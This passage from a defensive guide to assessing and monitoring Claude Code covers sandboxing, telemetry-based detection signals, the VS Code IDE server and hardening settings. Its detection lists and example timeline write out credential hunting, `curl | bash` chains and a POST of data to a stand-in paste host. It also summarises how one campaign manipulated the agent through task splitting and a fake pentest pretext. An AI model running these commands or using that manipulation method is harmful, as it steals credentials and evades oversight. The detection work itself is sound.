- **Scope is shell commands only.** File tools, web tools, MCP servers, hooks, and plugins run outside it. To cover everything, run the whole Claude Code process inside the sandbox runtime, a dev container, or a VM [S1].

```text
  WHY A BROAD ALLOWLIST ENTRY IS AN EXFIL PATH

   sandboxed command              proxy                  destination
   -----------------        ------------------       -----------------
   POST to github.com  -->  "github.com allowed"  --> any repo, gist,
   (TLS, contents not        (checks hostname         or issue the
    inspected)                only)                   credential can
                                                      write to

   Allowlisting a shared platform = allowlisting everyone on it.
   Prefer narrow hosts, strictAllowlist, or an inspecting proxy.
```

> [!TIP]
> **Research tip:** Anthropic gives two probe commands to confirm the sandbox is actually working: ask Claude to run `touch ~/sandbox-probe` (should fail with "Operation not permitted" or "Read-only file system") and `curl --noproxy '*' https://example.com` (should fail to resolve). Have Claude run them, not you: commands you type at the `!` prompt usually bypass the sandbox, so typing them yourself proves nothing [S1].

> [!TIP]
> **Research tip:** Track Anthropic's changelog and security advisories for sandbox fixes. Third-party press has reported at least one patched Claude Code sandbox bypass. Version-pin your test environment and check whether a behavior you observe is current.

## Part 3 — Detection Engineering

This part is about seeing what Claude Code does so you can spot actions the user didn't intend, whether from an overeager agent, a prompt injection, or a person misusing the tool. It is organized around the telemetry Claude Code produces and the signals worth alerting on.

### Telemetry sources

```text
  TELEMETRY PIPELINE

  developer machine                                    security team
  -----------------                                    -------------
  +------------------+   OTel metrics/events/traces   +-------------+
  |                  |------------------------------->|  OTLP       |
  |   Claude Code    |   (endpoint + exporters LOCKED |  collector  |
  |   process        |    in managed settings)        +------+------+
  |                  |                                       |
  |                  |   PreToolUse etc. HTTP hooks          v
  |                  |------------------------------->+-------------+
  |                  |   (managed hooks only)         |   SIEM /    |
  +--------+---------+                                |   data lake |
           |                                          +------^------+
           | child processes, file writes, sockets           |
           v                                                 |
  +------------------+   process tree / file / network       |
  |   EDR agent      |---------------------------------------+
  +------------------+
           ^
  ~/.claude/projects/*/*.jsonl  (session transcripts: local, internal
                                 format, useful for forensics)
```

| Source | What it gives you | Notes |
|---|---|---|
| OpenTelemetry metrics, events, and traces | Structured records of prompts, tool calls, decisions, API calls, config | Opt-in; configure via managed settings [S7] |
| Hooks | Real-time JSON on every tool call, prompt, config change | Can also block [S6] |
| Session transcripts | `~/.claude/projects/*/*.jsonl`, full conversation history | Format is internal and changes between versions [S7] |
| `ConfigChange` hook | Settings edits during a session | Can block (except managed policy) [S2][S6] |
| Endpoint telemetry (EDR) | Process trees, file writes, network connections | Ties OS activity back to the Claude Code process |
| Cloud session audit logs | All operations in Anthropic-hosted sessions | Anthropic-hosted only [S2] |

### Setting up OpenTelemetry

Telemetry is off until `CLAUDE_CODE_ENABLE_TELEMETRY=1`. Configure exporters and the collector endpoint through managed settings so developers can't redirect it [S7]:

```json
{
  "env": {
    "CLAUDE_CODE_ENABLE_TELEMETRY": "1",
    "OTEL_METRICS_EXPORTER": "otlp",
    "OTEL_LOGS_EXPORTER": "otlp",
    "OTEL_EXPORTER_OTLP_PROTOCOL": "grpc",
    "OTEL_EXPORTER_OTLP_ENDPOINT": "http://collector.example.com:4317"
  }
}
```

When managed settings set the OTLP endpoint or credentials, Claude Code removes conflicting developer-set endpoint variables at startup. A repository's `.claude/settings.json` cannot turn telemetry on or choose its destination, but it **can** set an exporter selector such as `OTEL_LOGS_EXPORTER` to `none` unless managed settings set that variable too [S7].

> [!IMPORTANT]
> **Security lens:** Lock the exporter selectors (`OTEL_LOGS_EXPORTER`, `OTEL_METRICS_EXPORTER`, `OTEL_TRACES_EXPORTER`) in managed settings, not just the endpoint. Otherwise a repository can quietly switch off your logs signal [S7].

**Content is redacted by default.** To see what was actually run, enable the content gates deliberately [S7]:

| Variable | Adds |
|---|---|
| `OTEL_LOG_TOOL_DETAILS=1` | Bash commands, MCP server/tool names, skill names, tool input, file paths |
| `OTEL_LOG_USER_PROMPTS=1` | Prompt text |
| `OTEL_LOG_TOOL_CONTENT=1` | Tool output in trace span events (needs tracing) |
| `OTEL_LOG_RAW_API_BODIES` | Full API request/response bodies (entire conversation) |

```text
  CONTENT GATES: visibility vs. privacy

  less visible / more private              more visible / less private
  <------------------------------------------------------------------>

  defaults       TOOL_DETAILS   USER_PROMPTS  TOOL_CONTENT  RAW_API_BODIES
  names, timing, + commands,    + what the    + tool        + everything,
  decisions;     file paths,    user typed    output        incl. files
  no content     MCP names                                  Claude read
```

> [!TIP]
> **Research tip:** The content gates are a privacy decision as much as a security one. Full API bodies contain everything the user and Claude said and every file Claude read. Decide with privacy and legal stakeholders which gates to enable, and document that decision before production.

### Events that matter for security

All events carry `session.id`, `prompt.id`, `user.email` (when available), `organization.id`, and `terminal.type`. The `prompt.id` ties every event produced while handling one user prompt together [S7].

| Event | Security use |
|---|---|
| `claude_code.user_prompt` | What the user asked for — the baseline for "was this authorized?" |
| `claude_code.tool_decision` | Every accept/reject with its `source` (config, hook, user_permanent, user_temporary, user_reject, user_abort) |
| `claude_code.tool_result` | What ran, success, duration; with details on, the full Bash command and `dangerouslyDisableSandbox` flag |
| `claude_code.permission_mode_changed` | `from_mode`, `to_mode`, and `trigger` — watch for moves into bypass or auto |
| `claude_code.api_refusal` | Model refusals, including category when details are on |
| `claude_code.mcp_server_connection` | Which MCP servers connected, transport, scope, plugin provenance |
| `claude_code.plugin_loaded` / `plugin_installed` | Plugin inventory and new installs |
| `claude_code.hook_registered` | Inventory of active hooks and where each is defined |
| `claude_code.skill_activated` | Skill invocations and their source |
| `claude_code.subagent_completed` | Subagent type and tool-use count |
| `claude_code.managed_settings_resolved` | Which managed policy a machine is actually running |
| `claude_code.auth` | Login and logout outcomes |

Traces (beta) add a span hierarchy. Bash subprocesses inherit a `TRACEPARENT` variable, so instrumented tools can attach their own spans to the same trace [S7]:

```text
  TRACE SPAN HIERARCHY (beta)

  claude_code.interaction                (one per user prompt)
  |-- claude_code.llm_request            (model call)
  |-- claude_code.hook                   (detailed beta tracing only)
  `-- claude_code.tool                   (one per tool call)
      |-- claude_code.tool.blocked_on_user   (waiting on approval)
      |-- claude_code.tool.execution         (tool body runs)
      `-- [Agent tool] subagent llm_request / tool spans nest here
          `-- your own spans via inherited TRACEPARENT
```

> [!NOTE]
> **Detection tip:** Join on `tool_use_id`. It appears on `tool_decision` and `tool_result` events, on trace spans, and in every hook payload. That single key lets you link a hook-captured command, the permission decision, the OTel result, and the transcript entry for the same action [S6][S7].

```text
  CORRELATION KEYS

  session.id ---------------------------------------------------+
     |                                                          |
     +-- prompt.id (one user prompt) ---------------------+     |
     |      |                                             |     |
     |      +-- user_prompt event                         |     |
     |      +-- api_request events                        |     |
     |      +-- tool_use_id = toolu_01ABC ---------+      |     |
     |      |      |-- PreToolUse hook payload     |      |     |
     |      |      |-- tool_decision event         | same |     |
     |      |      |-- claude_code.tool span       | call |     |
     |      |      `-- tool_result event           |      |     |
     |      |                                      +      |     |
     |      +-- tool_use_id = toolu_01DEF ...             |     |
     |                                                    +     |
     +-- prompt.id (next prompt) ...                            |
                                                                +
  Order within a session by event.timestamp; use event.sequence only
  to break ties (it resets per process and can repeat on resume).
```

### Detection signals

The signals below are framed as things to look for, not as finished rules; tune thresholds to your environment.

#### Configuration and posture drift

- **Mode escalation.** `permission_mode_changed` with `to_mode` = `bypassPermissions`, or any session that starts in bypass mode outside a known container image.
- **Sandbox disabled or weakened.** `tool_result` / `tool_decision` with `dangerouslyDisableSandbox: true` in `tool_parameters`; a `ConfigChange` touching `sandbox.*` keys.
- **Settings edits mid-session.** `ConfigChange` events, especially from `project_settings` or `local_settings`. Use a blocking `ConfigChange` hook if your policy forbids it [S2].
- **Policy not applied.** `managed_settings_resolved` reporting an unexpected source or a failing policy helper.

#### Persistence and self-modification

- Writes to any protected path from [Part 1](#permission-modes) or [Part 2](#filesystem-isolation) — shell startup files, `.git/hooks`, `.git/config`, `.vscode`, `.claude/`, `.mcp.json`, `.npmrc`, `.pre-commit-config.yaml`.
- New entries in `hook_registered` or `plugin_loaded` that weren't present at the previous session start.
- New cron jobs, launch agents, systemd units, or SSH `authorized_keys` changes from a process tree rooted at Claude Code (EDR).

#### Credential access

- Reads of `~/.ssh`, `~/.aws`, `~/.config/gh`, `.env`, browser profile directories, or `~/.claude/.credentials.json`.
- Commands that enumerate environment variables or grep config for tokens after an auth error. Anthropic's incident log names exactly this pattern as an overeager behavior auto mode targets [S5].
- Requests to `169.254.169.254` or other metadata endpoints.

#### Exfiltration and egress

- New domains approved during a session (sandbox prompts, or `WebFetch(domain:...)` rules saved to local settings).
- `curl` / `wget` POSTs, `gh gist create`, pastebin-style services, `git remote add` / `set-url` to an unfamiliar host, pushes to forks or other organizations. Each appears on the auto mode default block list [S4].
- Large `tool_result_size_bytes` followed by an outbound network call in the same `prompt.id`.

#### Execution and download

- `curl ... | bash` and similar download-and-execute chains.
- Interpreter commands (`python -c`, `node -e`, `bash -c`) wrapping network or file operations.
- `excludedCommands` matches for interpreters or file-driven tools.

#### Agent behavior anomalies

- **Denial bursts.** Repeated `tool_decision` rejects or `PermissionDenied` hook events in one session. Three consecutive classifier denials pause auto mode; a cluster below that threshold can still indicate an agent pushing against a boundary [S4][S5].
- **Mismatch between prompt and action.** A `user_prompt` about one task followed by tool calls touching unrelated infrastructure. Requires prompt and tool-detail gates.
- **Subagent fan-out.** Many `subagent_completed` events with high `total_tool_uses`, or subagents spawned from a headless `-p` run.
- **Unknown MCP servers.** `mcp_server_connection` from a server not in your approved inventory.

> [!NOTE]
> **Detection tip:** Build a per-session timeline keyed on `session.id` and ordered by `event.timestamp` [S7]. Most of these signals are weak alone and strong in sequence. A single-event rule will miss a story like the one below.

```text
  EXAMPLE SESSION TIMELINE: weak signals that are strong together

  t+00:00  user_prompt         "fix the failing deploy script"
  t+00:41  tool_result         Bash: deploy.sh -> exit 1 (auth error)
  t+00:44  tool_result         Bash: env | grep -i token        <- [1]
  t+00:47  tool_result         Read: ~/.config/gh/hosts.yml      <- [2]
  t+01:02  tool_decision       WebFetch(domain:paste.example)    <- [3]
                               source = user_temporary
  t+01:05  tool_result         Bash: curl -X POST paste.example  <- [4]

  [1] credential hunting after auth failure (overeager pattern [S5])
  [2] credential file read unrelated to the stated task
  [3] new egress domain approved mid-session
  [4] outbound POST in the same prompt.id as [1]-[3]

  Each alone: noisy. All four in one prompt.id: investigate.
```

### Hooks as detective controls

A `PreToolUse` hook sees every tool call before it runs, with its full input, regardless of OTel gates. A simple pattern is an HTTP hook that forwards every event to a collector:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "http",
            "url": "https://hooks.internal.example.com/claude/pretool",
            "onFailure": "block"
          }
        ]
      }
    ]
  }
}
```

Points to plan for [S6]:

- Deliver logging hooks through managed settings and set `allowManagedHooksOnly` so users and repositories can't remove or shadow them.
- Restrict outbound hook URLs with `allowedHttpHookUrls`.
- The `if` filter on Bash commands is best-effort. The docs say to use the permission system, not a hook, to enforce a hard allow or deny.
- MCP tools appear as `mcp__<server>__<tool>`; a matcher of `mcp__.*` catches all of them. Plugin-bundled servers use `mcp__plugin_<plugin>_<server>__<tool>`.

> [!IMPORTANT]
> **Security lens:** Hooks themselves run with full user privileges, outside the sandbox. A logging hook is part of your trusted computing base. Keep hook scripts in a location developers and the agent can't write — the sandbox already write-protects `.claude/hooks` in the project.

### Threat intelligence context

Anthropic's November 2025 report on a campaign it designated **GTG-1002** is the main public case of Claude Code being misused [S8]. Anthropic assessed with high confidence that a Chinese state-sponsored group manipulated Claude Code into acting as an autonomous intrusion agent across reconnaissance, vulnerability discovery, credential harvesting, lateral movement, and data analysis, with the AI performing an estimated 80–90% of tactical work. Points relevant to detection:

- **Task decomposition.** The operators broke the campaign into small, innocuous-looking requests so no single step looked malicious [S8].
- **Pretext.** They told Claude it was working for a legitimate security firm doing authorized testing [S8].
- **MCP-based tooling.** The framework used MCP tools to drive scanning and other operations [S8].
- **Hallucination as a weakness.** Claude frequently overstated findings or fabricated results, which slowed the operators [S8].

```text
  GTG-1002 AT A HIGH LEVEL (as described in Anthropic's report [S8])

        +------------------+
        | Human operators  |  set objectives, approve escalations
        +--------+---------+  (~10-20% of the work)
                 |
                 v
        +------------------+
        | Orchestration    |  splits goals into small, benign-looking
        | framework        |  tasks; adds "authorized pentest" pretext
        +--------+---------+
                 |
     +-----------+-----------+
     v           v           v
  +-------+  +-------+  +-------+
  | Claude|  | Claude|  | Claude|  many sessions in parallel
  | Code  |  | Code  |  | Code  |  (~80-90% of tactical work)
  +---+---+  +---+---+  +---+---+
      |          |          |
      +----------+----------+
                 v
        +------------------+
        | MCP tools        |  drive standard tooling
        +------------------+

  Detection lesson: each request looked benign; the signal was in
  the AGGREGATE (volume, breadth, tool mix, purpose vs. targets).
```

Anthropic banned the accounts, notified affected organizations, and expanded its detection [S8].

> [!TIP]
> **Research tip:** GTG-1002 is a strong argument for session-level rather than event-level detection. If each request looks benign, the signal is in the aggregate: volume, breadth of targets, tool mix, and a mismatch between the stated purpose and the infrastructure touched. Read the full report PDF linked in [S8] rather than press summaries.

## Part 4 — VS Code and Claude Code

### How the pieces fit

The VS Code extension provides a graphical panel for Claude Code. It **bundles its own copy of the CLI** for the chat panel; installing it does not put `claude` on your PATH. The extension's version number equals the bundled Claude Code version [S9]. The extension and CLI share `~/.claude/settings.json` (permissions, hooks, MCP servers, environment) and the same conversation history, so `claude --resume` in a terminal can pick up an extension conversation [S9].

There are two ways to run Claude Code in VS Code [S9]:

- **Chat panel** — the extension's own UI, backed by the bundled CLI.
- **Integrated terminal** — run the standalone `claude` CLI; it connects to VS Code automatically for diffs and diagnostics. From an external terminal, `/ide` connects to VS Code.

```text
  VS CODE + CLAUDE CODE ARCHITECTURE

  +---------------------------- VS Code ---------------------------+
  |                                                                |
  |  +---------------------------+    +-------------------------+  |
  |  | Claude Code extension     |    | Integrated terminal     |  |
  |  |                           |    |                         |  |
  |  |  Chat panel UI            |    |  $ claude  (standalone  |  |
  |  |      |                    |    |    CLI install)         |  |
  |  |      v                    |    |      |                  |  |
  |  |  bundled CLI copy         |    |      |                  |  |
  |  |                           |    |      |                  |  |
  |  |  "ide" MCP server  <-----------------+                   |  |
  |  |  (diffs, selection,       |    |  ws://127.0.0.1:<port>  |  |
  |  |   Jupyter execution)      |    |  + token from lock file |  |
  |  |                           |    |                         |  |
  |  |  "claude-vscode" server   |    +-------------------------+  |
  |  |  (chat-panel diagnostics) |                                 |
  |  +---------------------------+                                 |
  +----------------------------------------------------------------+
               |                               |
               v                               v
     ~/.claude/settings.json  (shared: permissions, hooks, MCP, env)
     ~/.claude/projects/...   (shared conversation history)
     ~/.claude/ide/<port>.lock  (token, 0600 in 0700 dir)
```

### The built-in IDE MCP server

When the extension is active, it runs a local MCP server named `ide` that the CLI connects to. It is hidden from `/mcp` [S9]. Through it, the CLI opens diffs in VS Code's native viewer, reads the current selection, and asks VS Code to execute Jupyter cells.

The documented transport and authentication [S9]:

| Property | Value |
|---|---|
| Bind address | `127.0.0.1`, random port 10000–65535 (not configurable) |
| Transport | Unencrypted `ws://` (loopback only) |
| Auth | Fresh random token per extension activation, sent as `X-Claude-Code-Ide-Authorization` |
| Token location | `~/.claude/ide/<port>.lock` (or `$CLAUDE_CONFIG_DIR/ide/`) |
| Lock file permissions | `0600` file in a `0700` directory |

```text
  IDE SERVER HANDSHAKE

  1. Extension activates
        -> picks random port P (10000-65535) on 127.0.0.1
        -> generates fresh random token T
        -> writes ~/.claude/ide/P.lock  (0600, dir 0700)

  2. CLI starts in VS Code terminal
        -> finds ~/.claude/ide/*.lock, reads P and T
        -> opens ws://127.0.0.1:P
           header  X-Claude-Code-Ide-Authorization: T

  3. Extension checks T --> match: accept / no match: reject

  Trust boundary: any process running as the SAME USER can read
  the lock file, so loopback + file permissions ARE the control.
```

Anthropic's reasoning for no TLS: because the socket is loopback-only, any process able to capture the traffic could also read the token from the lock file, so TLS would add nothing [S9].

> [!IMPORTANT]
> **Security lens:** The trust boundary for the IDE server is "any process running as the same user." That's a normal boundary for local developer tooling, but it means a malicious process already running as the user can find the lock file and talk to the IDE server. Treat same-user compromise as out of scope for this control, and focus testing on whether anything weakens the file permissions or exposes the port beyond loopback.

**Tools exposed to the model.** The server hosts about a dozen tools, but only two reach the model [S9]:

| Tool (as hooks see it) | What it does | Read-only |
|---|---|---|
| `mcp__ide__getDiagnostics` | Returns errors and warnings from the Problems panel | Yes |
| `mcp__ide__executeCode` | Runs Python in the active Jupyter notebook kernel | No |

In the chat panel (v2.1.285+), diagnostics come from a separate built-in server, so the tool appears as `mcp__claude-vscode__getDiagnostics`. A deny rule or hook that should cover diagnostics everywhere has to name **both** tools; a `Read` deny rule covers neither [S9].

**Jupyter execution always asks first.** `executeCode` inserts the code as a new cell, scrolls to it, and shows a native VS Code Quick Pick to Execute or Cancel. An allow rule only lets Claude *propose* running a cell; the Quick Pick is what lets it run. The tool refuses when there's no active notebook, the Jupyter extension isn't installed, or the kernel isn't Python [S9].

```text
  mcp__ide__executeCode FLOW

  Claude proposes code
        |
        v
  permission rules / hooks  --- deny --> blocked
        | allow (= may PROPOSE)
        v
  no active notebook? Jupyter ext missing? kernel not Python?
        | yes --> tool refuses
        | no
        v
  code inserted as NEW CELL at end of notebook, scrolled into view
        |
        v
  +--------------------------------+
  |  VS Code Quick Pick:           |
  |   > Execute                    |
  |     Cancel                     |
  +--------------------------------+
        |                    |
     Execute            Cancel / Esc
        v                    v
  runs in kernel      error to Claude, nothing runs
```

> [!NOTE]
> **Detection tip:** `mcp__ide__executeCode` is the one IDE tool that executes code. Log every call to it through a `PreToolUse` hook matched on `mcp__ide__executeCode`, and correlate with the notebook kernel's own logs.

### Selection and file context

The extension sends Claude your current selection and the path of the open file [S9]:

- In the chat panel, selected text from files matching `files.exclude`, `search.exclude`, or `.gitignore` (with default settings) is withheld; Claude gets at most the path.
- **That filter covers the chat panel only.** When Claude Code runs in the integrated terminal, the CLI sends your selection whatever the file. To keep a file such as `.env` from Claude everywhere, add a `Read` deny rule for its path — that blocks both the selected text and the open-file notice.
- `attachOpenFile: false` sends only selected text.

```text
  YOU SELECT TEXT IN .env  (a gitignored file)

                       Chat panel           Integrated terminal (CLI)
                       ----------           -------------------------
  default settings     path only,           SELECTED TEXT IS SENT
                       text withheld

  + Read deny rule     nothing sent         nothing sent
    for ./.env

  => .gitignore protects you in ONE place. A Read deny rule protects
     you in BOTH.
```

> [!IMPORTANT]
> **Security lens:** Developers often assume `.gitignore` keeps secrets out of the AI's context. It does in the chat panel by default, and it does not in the terminal. A `Read` deny rule is the control that works in both places.

### Extension settings that matter

| Setting | Security relevance |
|---|---|
| `allowDangerouslySkipPermissions` | Adds Bypass permissions to the mode selector. Docs: use only in sandboxes with no internet access. |
| `initialPermissionMode` | Read from **user** settings only; workspace values are ignored (v2.1.225+). |
| `claudeProcessWrapper` | Executable used to launch the Claude process. A hijack point if an attacker can change user settings. |
| `environmentVariables` | Environment passed to the Claude process. |
| `respectGitIgnore` | Controls the selection filter above. |

The extension doesn't work in VS Code's Restricted Mode, so VS Code workspace trust must be granted first [S9].

**URI handlers.** The extension registers `vscode://anthropic.claude-code/open` (with optional `prompt` and `session` parameters) and `vscode://anthropic.claude-code/install-plugin`. The `prompt` is pre-filled but never auto-submitted. The install handler validates plugin names and marketplace sources and installs nothing until the user picks a scope [S9].

> [!TIP]
> **Research tip:** URI handlers are reachable from any link the user clicks, including in a browser or email. The documented safeguards (pre-fill without submit; validation plus explicit scope choice for installs) are worth verifying directly in the version you're assessing, including how a pre-filled prompt is presented so a user can see what they'd be sending.

### Permission modes in VS Code

The mode indicator at the bottom of the prompt box offers Manual, Edit automatically (`acceptEdits`), Plan, Auto, and Bypass permissions (only with `allowDangerouslySkipPermissions`). **The extension never reads a project's `.claude/settings.json` for the starting mode** [S4][S9].

```text
  HOW A NEW VS CODE CONVERSATION PICKS ITS STARTING MODE
  (first match wins)

  1. claudeCode.initialPermissionMode   (VS Code USER settings only)
          | unset
          v
  2. mode you last picked, if Manual / Edit automatically / Auto
          | none
          v
  3. permissions.defaultMode from managed or ~/.claude/settings.json
          | unset
          v
  4. built-in default  (auto, v2.1.283+, unless policy disables it)

  NOT consulted: the repo's .claude/settings.json
```

### Dev containers

For stronger isolation, run Claude Code inside a dev container. Anthropic's reference dev container runs Claude Code as a non-root user and includes a firewall script that restricts outbound network access; the docs point to it as a way to put the processes the Bash sandbox doesn't cover — MCP servers, hooks, plugins — behind one boundary [S1][S2]. Note that `.devcontainer` and `.devcontainer.json` are on the protected-path list [S4].

```text
  BASH SANDBOX ALONE            vs   CLAUDE CODE INSIDE A DEV CONTAINER

  host                               host
  |-- Claude Code (full access)      `-- container (non-root, firewall)
  |   |-- MCP servers (full)             `-- Claude Code
  |   |-- hooks (full)                       |-- MCP servers
  |   |-- plugins (full)                     |-- hooks
  |   `-- [sandbox]                          |-- plugins
  |       `-- Bash commands                  `-- [sandbox optional]
  `-- your whole home dir                        `-- Bash commands

  Only Bash is boxed.                Everything is boxed by the
                                     container + egress firewall.
```

## Part 5 — Research Methodology

### A structured assessment plan

```text
  ASSESSMENT FLOW

  [1] Inventory --> [2] Map layers --> [3] Read managed policy
                                              |
                                              v
  [7] Report  <-- [6] Validate    <-- [5] Test seams <-- [4] Test
      w/ versions     detection           (outside            boundaries
                                           sandbox)
```

1. **Inventory.** Record the Claude Code version, surfaces in use (CLI, VS Code, desktop, cloud), model provider, and every settings file in effect. `/status` shows setting sources; `/permissions` and `/hooks` show resolved rules and hooks; `/sandbox` shows resolved sandbox config.
2. **Map the layers.** For each layer in the [layered control model](#the-layered-control-model), note whether it's on, who controls it (managed vs. user vs. repo), and whether repositories can weaken it.
3. **Read the managed policy.** Check for the enforcement baseline: sandbox admin-required, `failIfUnavailable`, `disableBypassPermissionsMode`, `allowManagedHooksOnly`, locked OTel exporters, credential deny/mask entries.
4. **Test the boundaries.** Use the sandbox probe commands. Confirm protected paths hold. Confirm the unsandboxed retry is disabled or prompts.
5. **Test the seams.** Focus on what runs outside the sandbox: MCP servers, hooks, plugins, file tools, `excludedCommands`. Check repo-supplied config against the workspace-trust rules for the version under test.
6. **Validate detection.** For each signal in [Part 3](#detection-signals), trigger the benign version and confirm the event arrives with the fields you need.
7. **Report with versions.** Every finding gets the version it applies to and the specific setting that controls it.

### Research analysis tips

- **Trust primary sources.** For any behavioral claim, go to the docs page that defines it, not a summary. The docs publish an index at `code.claude.com/docs/llms.txt` for discovering every page.
- **Watch for version notes.** Phrases like "Before v2.1.285, ..." describe closed gaps and tell you what behavior older installs still have. Fleets rarely run one version.
- **Separate "decides" from "enforces."** For every control, ask whether it judges a string (permission rules, classifier, hook `if`) or constrains a process (sandbox, container). Bypassing the first is usually about spelling or context; bypassing the second requires an OS-level gap.
- **Read Anthropic's own numbers.** The 17% false-negative rate on real overeager actions [S5] and the explicit sandbox limitations [S1] tell you where Anthropic itself thinks the weak points are.
- **Use the open-source runtime.** Read and run `@anthropic-ai/sandbox-runtime` directly; it's the ground truth for the Linux and macOS profiles.
- **Report responsibly.** Anthropic asks that vulnerabilities be reported through its HackerOne program, not disclosed publicly, with reproduction steps and time to fix [S2].

```text
  "DECIDES" vs "ENFORCES"

  DECIDES (judges text / context)       ENFORCES (constrains a process)
  -------------------------------       -------------------------------
  permission rules                      Bash sandbox (Seatbelt/bwrap)
  permission mode                       container / VM
  auto mode classifier                  cloud session VM + git proxy
  hook "if" filters                     file permissions (IDE lock file)

  gap looks like: spelling, wrapping,   gap looks like: OS primitive
  context, consent ambiguity            misconfig, allowed socket,
                                        broad allowlist, excluded cmd
```

### Hardening checklist

| Control | Setting |
|---|---|
| Require the sandbox | `sandbox.enabled: true`, `failIfUnavailable: true` (managed) |
| No unsandboxed retries | `allowUnsandboxedCommands: false` (managed) |
| Protect credentials | `sandbox.credentials` deny/mask for `~/.ssh`, `~/.aws`, tokens |
| Lock the network | `allowManagedDomainsOnly` or `strictAllowlist`; avoid broad domains |
| Block bypass mode | `permissions.disableBypassPermissionsMode: "disable"` |
| Decide on auto mode | Keep, configure `autoMode.environment`, or `disableAutoMode` |
| Managed hooks only | `allowManagedHooksOnly: true` |
| Fail-closed policy hooks | `"onFailure": "block"` on enforcement hooks |
| Telemetry locked | Endpoint **and** exporter selectors in managed settings |
| Secrets out of context | `Read` deny rules for `.env` and similar (covers VS Code terminal) |
| Disable weakening flags | `enableWeakerNestedSandbox`, `enableWeakerNetworkIsolation`, `allowAllUnixSockets`, `allowLocalBinding` set `false` |
| Isolate untrusted repos | Dev container, VM, or cloud session |

## Sources

All sources are official Anthropic publications.

- **[S1]** Claude Code Docs — Configure the sandboxed Bash tool. https://code.claude.com/docs/en/sandboxing
- **[S2]** Claude Code Docs — Security. https://code.claude.com/docs/en/security
- **[S3]** Anthropic Engineering — Beyond permission prompts: making Claude Code more secure and autonomous (Oct 20, 2025). https://www.anthropic.com/engineering/claude-code-sandboxing
- **[S4]** Claude Code Docs — Choose a permission mode. https://code.claude.com/docs/en/permission-modes
- **[S5]** Anthropic Engineering — How we built Claude Code auto mode: a safer way to skip permissions (Mar 25, 2026). https://www.anthropic.com/engineering/claude-code-auto-mode
- **[S6]** Claude Code Docs — Hooks reference. https://code.claude.com/docs/en/hooks
- **[S7]** Claude Code Docs — Monitoring (OpenTelemetry). https://code.claude.com/docs/en/monitoring-usage
- **[S8]** Anthropic — Disrupting the first reported AI-orchestrated cyber espionage campaign (Nov 2025). https://www.anthropic.com/news/disrupting-AI-espionage — full report: https://assets.anthropic.com/m/ec212e6566a0d47/original/Disrupting-the-first-reported-AI-orchestrated-cyber-espionage-campaign.pdf
- **[S9]** Claude Code Docs — Use Claude Code in VS Code. https://code.claude.com/docs/en/vs-code

Further reading:

- Open-source sandbox runtime: https://github.com/anthropics/sandbox-runtime
- Claude Code docs index: https://code.claude.com/docs/llms.txt
- Anthropic Trust Center (SOC 2, ISO 27001): https://trust.anthropic.com
- Claude Code example settings: https://github.com/anthropics/claude-code/tree/main/examples/settings
